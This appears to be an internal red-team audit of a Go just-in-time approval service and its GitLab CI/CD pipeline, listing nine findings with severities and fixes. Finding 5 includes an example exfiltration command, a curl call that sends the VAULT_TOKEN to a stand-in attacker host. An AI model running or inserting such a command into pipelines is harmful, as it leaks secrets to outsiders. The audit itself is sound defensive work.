
## 01:26 — Red Team Audit: JIT Service + CI/CD Token Exposure

### Finding 1: No Size Cap on Request Store — **Medium**
**File:** `docker/jit-approval-svc/internal/store/store.go`
**Issue:** The in-memory `requests` map grows unbounded. `Cleanup()` runs every 5 min and removes resolved requests >1h old, but **pending requests are never removed** by cleanup (explicit check: `req.Status != StatusPending`). An attacker with a valid API key could flood `/request` with T2 requests (require manual approval), and they'd remain in memory forever since they never get resolved unless Noah clicks approve/deny.
**Status:** NOT FIXED from prior audit. The `Cleanup` function still skips pending requests.
**Attack:** DoS via memory exhaustion — send thousands of T2 requests. Each spawns a `watchTimeout` goroutine (5 min timer), compounding goroutine+memory pressure.
**Fix:** Add `maxRequests` cap (e.g., 1000). Reject new requests when exceeded. Also, `Cleanup` should remove ancient pending requests (>1h pending = dead).

### Finding 2: Webhook Secret Comparison is NOT Constant-Time — **High**
**File:** `docker/jit-approval-svc/internal/handler/handler.go:178`
**Code:** `secretHeader != h.cfg.TelegramWebhookSecret` — plain `!=` string comparison.
**Issue:** Timing side-channel. An attacker who can bypass the nginx CIDR allowlist (or is on the internal network) could use timing analysis to brute-force the webhook secret character by character.
**Fix:** Use `crypto/subtle.ConstantTimeCompare([]byte(secretHeader), []byte(h.cfg.TelegramWebhookSecret))`.

### Finding 3: API Key Comparison is NOT Constant-Time — **High**
**File:** `docker/jit-approval-svc/internal/handler/handler.go:76,133`
**Code:** `apiKey != h.cfg.JITAPIKey` — same issue as Finding 2.
**Fix:** Use `crypto/subtle.ConstantTimeCompare` for the JIT API key check too.

### Finding 4: Callback Replay — Mitigated but Imperfect — **Low**
**File:** `handler.go:processCallback()`
**Analysis:** The code checks `req.Status != StatusPending` before processing, so replaying an already-approved callback is a no-op. ✅ Good.
**Residual risk:** Telegram callback_query IDs are not tracked/deduplicated. If Telegram retries a webhook delivery for the same callback, and the first delivery was slow (race window between status check and approval), there's a theoretical TOCTOU race. Practically very low risk given the mutex in store.
**Status:** Acceptable.

### Finding 5: CI/CD VAULT_TOKEN Can Read ALL Secrets — **Critical**
**File:** `.gitlab-ci.yml` — `vault:configure` and `vault:validate` jobs
**Issue:** The `VAULT_TOKEN` CI/CD variable is used in `terraform plan/apply` with full Vault access. Key observations:
- `vault:validate` runs on **MR pipelines** (`$CI_PIPELINE_SOURCE == "merge_request_event"`)
- It first tries JWT auth (`vault-read` role), but **falls back to `$VAULT_TOKEN`** if JWT fails
- If `VAULT_TOKEN` is a **protected variable**, MR pipelines on unprotected branches won't have it → JWT fallback is the only path. This is SAFE if configured correctly.
- **BUT:** If `VAULT_TOKEN` is NOT protected, any MR pipeline can access it. A malicious MR could modify the `vault:validate` script to exfiltrate `$VAULT_TOKEN` (e.g., `curl https://attacker.com/$VAULT_TOKEN`).
- `ROUTER_PRIVATE_KEY_BASE64` appears to be protected (the code checks if it's empty and gracefully degrades). Good pattern.
**Verdict:** Need to verify `VAULT_TOKEN` is marked as `protected` in GitLab CI/CD settings. If it is, this is mitigated. If not, it's **Critical**.
**Fix:** (1) Mark `VAULT_TOKEN` as protected + masked. (2) Better: eliminate `VAULT_TOKEN` entirely from validate — the JWT `vault-read` role should be sufficient; remove the fallback. (3) Consider removing MR pipeline access to vault:validate entirely if JWT isn't working yet.

### Finding 6: SSH Key Available to MR Pipelines — **Medium**
**File:** `.gitlab-ci.yml` — `.ansible` template
**Issue:** `ROUTER_PRIVATE_KEY_BASE64` is decoded into a file. The code does handle it being empty on unprotected branches, but if it were NOT protected, MR pipelines could SSH to the router as root.
**Status:** Appears to be protected (graceful degradation code suggests it's sometimes empty). Verify.

### Finding 7: Docker Build Uses Remote Docker Host Without TLS — **Medium**
**File:** `.gitlab-ci.yml` — `.docker_build` template
**Code:** `DOCKER_HOST: "tcp://10.4.32.2:2375"` — port 2375 = unencrypted Docker API.
**Issue:** No TLS verification. MITM on the management VLAN could intercept/modify builds. Also, any service on mgmt VLAN can talk to this Docker socket.
**Fix:** Use TLS (port 2376) with client certificates, or use Docker-in-Docker with socket.

### Finding 8: Nginx Telegram CIDR Allowlist — **Low (Incomplete)**
**File:** `docker/nginx/http-external-drop-in.conf`
**Configured CIDRs:**
- 91.108.56.0/22 ✅
- 91.108.4.0/22 ✅
- 91.108.8.0/22 ✅
- 91.108.16.0/22 ✅
- 91.108.12.0/22 ✅
- 149.154.160.0/20 ✅
- 91.105.192.0/23 ✅
- 91.108.20.0/22 ✅
- 185.76.151.0/24 ✅

**Telegram docs say:** `149.154.160.0/20` and `91.108.4.0/22`. The config includes more specific subnets which is fine (superset coverage). The list looks comprehensive and matches known Telegram Bot API source ranges.
**Note:** Telegram warns these may change. Consider periodic automated verification.
**Verdict:** Allowlist looks correct and complete as of Feb 2026.

### Finding 9: Health Endpoint Unauthenticated — **Low**
**File:** `handler.go:HandleHealth()`
**Issue:** `/health` requires no API key. Exposes vault connection status and request count. Minor information disclosure.
**Fix:** Consider requiring API key for `/health` or returning minimal info to unauthenticated callers.

### Summary Table
| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | Unbounded request store (DoS) | Medium | NOT FIXED |
| 2 | Webhook secret not constant-time | High | NEW |
| 3 | API key not constant-time | High | NEW |
| 4 | Callback replay | Low | Mitigated |
| 5 | CI/CD VAULT_TOKEN exposure to MR pipelines | Critical* | VERIFY |
| 6 | SSH key exposure to MR pipelines | Medium | Likely protected |
| 7 | Docker build over unencrypted TCP | Medium | EXISTING |
| 8 | Telegram CIDR allowlist | Low | Complete |
| 9 | Unauthenticated /health | Low | EXISTING |

*Critical if VAULT_TOKEN is not a protected variable; Medium if it is.

### Recommended Priority Actions
1. **Verify `VAULT_TOKEN` is protected+masked in GitLab CI/CD settings** — if not, fix immediately
2. **Remove VAULT_TOKEN fallback from `vault:validate`** — JWT-only for MR pipelines
3. **Add `crypto/subtle.ConstantTimeCompare`** for both API key and webhook secret
4. **Add store size cap** (max 1000 requests, reject with 429 when full)
5. **Add pending request cleanup** in `Cleanup()` for requests pending >1h
